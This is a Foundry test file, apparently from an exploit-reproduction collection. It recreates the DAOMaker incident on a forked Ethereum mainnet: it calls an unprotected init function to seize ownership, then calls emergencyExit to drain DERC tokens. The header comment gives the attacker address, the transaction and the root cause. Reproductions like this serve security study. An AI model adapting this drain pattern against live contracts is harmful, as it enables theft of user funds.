// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./../interface.sol";
/*
    Attacker: 0x2708cace7b42302af26f1ab896111d87faeff92f
    Attack tx: https://etherscan.io/tx/0x96bf6bd14a81cf19939c0b966389daed778c3a9528a6c5dd7a4d980dec966388
    Affected contracts:
        0x6e70c88be1d5c2a4c0c8205764d01abe6a3d2e22 - emergencyExit with 13.5M CAPS
        0xd6c8dd834abeeefa7a663c1265ce840ca457b1ec - emergencyExit with 2.5M CPD, twice
        0xdd571023d95ff6ce5716bf112ccb752e86212167 - emergencyExit with 1.44M DERC
        0xa43b89d5e7951d410585360f6808133e8b919289 - emergencyExit with approx 20.6M SHO
    Root cause: They left the `init` function unprotected. The attacker re-initialized the contract with 
    malicious data and then called `emergencyExit` to get away with the funds.*/

interface DAOMaker {
    function init(uint256, uint256[] calldata, uint256[] calldata, address) external;
    function emergencyExit(address) external;
}

contract ContractTest is Test {
    DAOMaker daomaker = DAOMaker(0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940);
    IERC20 DERC = IERC20(0x9fa69536d1cda4A04cFB50688294de75B505a9aE);

    function setUp() public {
        vm.createSelectFork("mainnet", 13_155_320); // fork mainnet block number 13155320
    }

    function testExploit() public {
        uint256[] memory releasePeriods = new uint256[](1);
        releasePeriods[0] = 5_702_400;
        uint256[] memory releasePercents = new uint256[](1);
        releasePercents[0] = 10_000;

        emit log_named_decimal_uint("Before exploiting, Attacker DERC balance", DERC.balanceOf(address(this)), 18);

        // initialize to become contract owner
        daomaker.init(1_640_984_401, releasePeriods, releasePercents, 0x9fa69536d1cda4A04cFB50688294de75B505a9aE);

        // call emergencyExit to drain out the token.
        daomaker.emergencyExit(address(this));

        emit log_named_decimal_uint("After exploiting, Attacker DERC balance", DERC.balanceOf(address(this)), 18);
    }

    receive() external payable {}
}
